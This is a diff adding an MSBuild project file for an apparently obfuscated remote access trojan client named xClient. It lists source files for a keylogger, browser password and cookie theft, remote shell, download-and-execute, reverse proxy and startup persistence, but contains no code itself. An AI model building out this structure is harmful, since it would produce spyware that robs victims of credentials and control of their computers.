@@ -1,0 +1,247 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProjectGuid>{FA44F039-9E09-4B5B-906F-734B6357321C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>xClient.Core</RootNamespace>
+    <AssemblyName>Client</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Class10</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Class10.cs" />
+    <Compile Include="Class11.cs" />
+    <Compile Include="Class12.Designer.cs">
+      <DependentUpon>Class12.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Class13.cs" />
+    <Compile Include="Compression\JpgCompression.cs" />
+    <Compile Include="Compression\SafeQuickLZ.cs" />
+    <Compile Include="GClass0.cs" />
+    <Compile Include="GClass1.cs" />
+    <Compile Include="GClass10.cs" />
+    <Compile Include="GClass11.cs" />
+    <Compile Include="GClass12.cs" />
+    <Compile Include="GClass13.cs" />
+    <Compile Include="GClass14.cs" />
+    <Compile Include="GClass15.cs" />
+    <Compile Include="GClass16.cs" />
+    <Compile Include="GClass17.cs" />
+    <Compile Include="GClass18.cs" />
+    <Compile Include="GClass19.cs" />
+    <Compile Include="GClass2.cs" />
+    <Compile Include="GClass20.cs" />
+    <Compile Include="GClass21.cs" />
+    <Compile Include="GClass22.cs" />
+    <Compile Include="GClass23.cs" />
+    <Compile Include="GClass24.cs" />
+    <Compile Include="GClass25.cs" />
+    <Compile Include="GClass26.cs" />
+    <Compile Include="GClass27.cs" />
+    <Compile Include="GClass28.cs" />
+    <Compile Include="GClass29.cs" />
+    <Compile Include="GClass3.cs" />
+    <Compile Include="GClass31.cs" />
+    <Compile Include="GClass32.cs" />
+    <Compile Include="GClass33.cs" />
+    <Compile Include="GClass34.cs" />
+    <Compile Include="GClass35.cs" />
+    <Compile Include="GClass4.cs" />
+    <Compile Include="GClass5.cs" />
+    <Compile Include="GClass6.cs" />
+    <Compile Include="GClass7.cs" />
+    <Compile Include="GClass8.cs" />
+    <Compile Include="GClass9.cs" />
+    <Compile Include="GEnum0.cs" />
+    <Compile Include="GEnum1.cs" />
+    <Compile Include="GEnum2.cs" />
+    <Compile Include="GEnum3.cs" />
+    <Compile Include="MouseKeyHook\Hook.cs" />
+    <Compile Include="MouseKeyHook\HotKeys\HotKeyArgs.cs" />
+    <Compile Include="MouseKeyHook\HotKeys\HotKeySet.cs" />
+    <Compile Include="MouseKeyHook\HotKeys\HotKeySetCollection.cs" />
+    <Compile Include="MouseKeyHook\IKeyboardEvents.cs" />
+    <Compile Include="MouseKeyHook\IKeyboardMouseEvents.cs" />
+    <Compile Include="MouseKeyHook\IMouseEvents.cs" />
+    <Compile Include="MouseKeyHook\Implementation\AppEventFacade.cs" />
+    <Compile Include="MouseKeyHook\Implementation\AppKeyListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\AppMouseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\BaseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\ButtonSet.cs" />
+    <Compile Include="MouseKeyHook\Implementation\Callback.cs" />
+    <Compile Include="MouseKeyHook\Implementation\EventFacade.cs" />
+    <Compile Include="MouseKeyHook\Implementation\GlobalEventFacade.cs" />
+    <Compile Include="MouseKeyHook\Implementation\GlobalKeyListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\GlobalMouseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\KeyboardState.cs" />
+    <Compile Include="MouseKeyHook\Implementation\KeyListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\MouseListener.cs" />
+    <Compile Include="MouseKeyHook\Implementation\Subscribe.cs" />
+    <Compile Include="MouseKeyHook\KeyEventArgsExt.cs" />
+    <Compile Include="MouseKeyHook\KeyPressEventArgsExt.cs" />
+    <Compile Include="MouseKeyHook\MouseEventExtArgs.cs" />
+    <Compile Include="MouseKeyHook\WinApi\AppMouseStruct.cs" />
+    <Compile Include="MouseKeyHook\WinApi\CallbackData.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookHelper.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookIds.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookNativeMethods.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookProcedure.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookProcedureHandle.cs" />
+    <Compile Include="MouseKeyHook\WinApi\HookResult.cs" />
+    <Compile Include="MouseKeyHook\WinApi\KeyboardHookStruct.cs" />
+    <Compile Include="MouseKeyHook\WinApi\KeyboardNativeMethods.cs" />
+    <Compile Include="MouseKeyHook\WinApi\Messages.cs" />
+    <Compile Include="MouseKeyHook\WinApi\MouseNativeMethods.cs" />
+    <Compile Include="MouseKeyHook\WinApi\MouseStruct.cs" />
+    <Compile Include="MouseKeyHook\WinApi\Point.cs" />
+    <Compile Include="MouseKeyHook\WinApi\ThreadNativeMethods.cs" />
+    <Compile Include="NetSerializer\CodeGenContext.cs" />
+    <Compile Include="NetSerializer\Helpers.cs" />
+    <Compile Include="NetSerializer\IDynamicTypeSerializer.cs" />
+    <Compile Include="NetSerializer\IStaticTypeSerializer.cs" />
+    <Compile Include="NetSerializer\ITypeSerializer.cs" />
+    <Compile Include="NetSerializer\Primitives.cs" />
+    <Compile Include="NetSerializer\Serializer.cs" />
+    <Compile Include="NetSerializer\TypeData.cs" />
+    <Compile Include="NetSerializer\TypeSerializers\ArraySerializer.cs" />
+    <Compile Include="NetSerializer\TypeSerializers\DictionarySerializer.cs" />
+    <Compile Include="NetSerializer\TypeSerializers\EnumSerializer.cs" />
+    <Compile Include="NetSerializer\TypeSerializers\GenericSerializer.cs" />
+    <Compile Include="NetSerializer\TypeSerializers\ObjectSerializer.cs" />
+    <Compile Include="NetSerializer\TypeSerializers\PrimitivesSerializer.cs" />
+    <Compile Include="Networking\Client.cs" />
+    <Compile Include="Packets\ClientPackets\DoDownloadFileResponse.cs" />
+    <Compile Include="Packets\ClientPackets\DoShellExecuteResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetAuthenticationResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetDesktopResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetDirectoryResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetDrivesResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetKeyloggerLogsResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetMonitorsResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetPasswordsResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetProcessesResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetStartupItemsResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetSystemInfoResponse.cs" />
+    <Compile Include="Packets\ClientPackets\SetStatus.cs" />
+    <Compile Include="Packets\ClientPackets\SetStatusFileManager.cs" />
+    <Compile Include="Packets\ClientPackets\SetUserStatus.cs" />
+    <Compile Include="Packets\IPacket.cs" />
+    <Compile Include="Packets\PacketHandler.cs" />
+    <Compile Include="Packets\ServerPackets\DoClientDisconnect.cs" />
+    <Compile Include="Packets\ServerPackets\DoClientReconnect.cs" />
+    <Compile Include="Packets\ServerPackets\DoClientUninstall.cs" />
+    <Compile Include="Packets\ServerPackets\DoClientUpdate.cs" />
+    <Compile Include="Packets\ServerPackets\DoDownloadAndExecute.cs" />
+    <Compile Include="Packets\ServerPackets\DoDownloadFile.cs" />
+    <Compile Include="Packets\ServerPackets\DoDownloadFileCancel.cs" />
+    <Compile Include="Packets\ServerPackets\DoKeyboardEvent.cs" />
+    <Compile Include="Packets\ServerPackets\DoMouseEvent.cs" />
+    <Compile Include="Packets\ServerPackets\DoPathDelete.cs" />
+    <Compile Include="Packets\ServerPackets\DoPathRename.cs" />
+    <Compile Include="Packets\ServerPackets\DoProcessKill.cs" />
+    <Compile Include="Packets\ServerPackets\DoProcessStart.cs" />
+    <Compile Include="Packets\ServerPackets\DoShellExecute.cs" />
+    <Compile Include="Packets\ServerPackets\DoShowMessageBox.cs" />
+    <Compile Include="Packets\ServerPackets\DoShutdownAction.cs" />
+    <Compile Include="Packets\ServerPackets\DoStartupItemAdd.cs" />
+    <Compile Include="Packets\ServerPackets\DoStartupItemRemove.cs" />
+    <Compile Include="Packets\ServerPackets\DoUploadAndExecute.cs" />
+    <Compile Include="Packets\ServerPackets\DoUploadFile.cs" />
+    <Compile Include="Packets\ServerPackets\DoVisitWebsite.cs" />
+    <Compile Include="Packets\ServerPackets\GetAuthentication.cs" />
+    <Compile Include="Packets\ServerPackets\GetDesktop.cs" />
+    <Compile Include="Packets\ServerPackets\GetDirectory.cs" />
+    <Compile Include="Packets\ServerPackets\GetDrives.cs" />
+    <Compile Include="Packets\ServerPackets\GetKeyloggerLogs.cs" />
+    <Compile Include="Packets\ServerPackets\GetMonitors.cs" />
+    <Compile Include="Packets\ServerPackets\GetPasswords.cs" />
+    <Compile Include="Packets\ServerPackets\GetProcesses.cs" />
+    <Compile Include="Packets\ServerPackets\GetStartupItems.cs" />
+    <Compile Include="Packets\ServerPackets\GetSystemInfo.cs" />
+    <Compile Include="Packets\ServerPackets\SetAuthenticationSuccess.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Recovery\Browsers\ADDURL_FLAG.cs" />
+    <Compile Include="Recovery\Browsers\Chrome.cs" />
+    <Compile Include="Recovery\Browsers\ExplorerUrlHistory.cs" />
+    <Compile Include="Recovery\Browsers\Firefox.cs" />
+    <Compile Include="Recovery\Browsers\FirefoxCookie.cs" />
+    <Compile Include="Recovery\Browsers\FirefoxPassword.cs" />
+    <Compile Include="Recovery\Browsers\IEnumSTATURL.cs" />
+    <Compile Include="Recovery\Browsers\InternetExplorer.cs" />
+    <Compile Include="Recovery\Browsers\IUrlHistoryStg.cs" />
+    <Compile Include="Recovery\Browsers\IUrlHistoryStg2.cs" />
+    <Compile Include="Recovery\Browsers\Opera.cs" />
+    <Compile Include="Recovery\Browsers\SHFILEINFO.cs" />
+    <Compile Include="Recovery\Browsers\SortFileTimeAscendingHelper.cs" />
+    <Compile Include="Recovery\Browsers\STATURL.cs" />
+    <Compile Include="Recovery\Browsers\STATURLFLAGS.cs" />
+    <Compile Include="Recovery\Browsers\STATURL_QUERYFLAGS.cs" />
+    <Compile Include="Recovery\Browsers\UrlHistoryClass.cs" />
+    <Compile Include="Recovery\Browsers\UUID.cs" />
+    <Compile Include="Recovery\Browsers\Win32api.cs" />
+    <Compile Include="Recovery\Browsers\Yandex.cs" />
+    <Compile Include="ReverseProxy\Packets\ReverseProxyConnect.cs" />
+    <Compile Include="ReverseProxy\Packets\ReverseProxyConnectResponse.cs" />
+    <Compile Include="ReverseProxy\Packets\ReverseProxyData.cs" />
+    <Compile Include="ReverseProxy\Packets\ReverseProxyDisconnect.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyCommandHandler.cs" />
+    <Compile Include="Utilities\Keylogger.cs" />
+    <Compile Include="Utilities\Shell.cs" />
+    <Compile Include="Utilities\UnsafeStreamCodec.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="xClient.Properties.Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Class12.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Class12.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
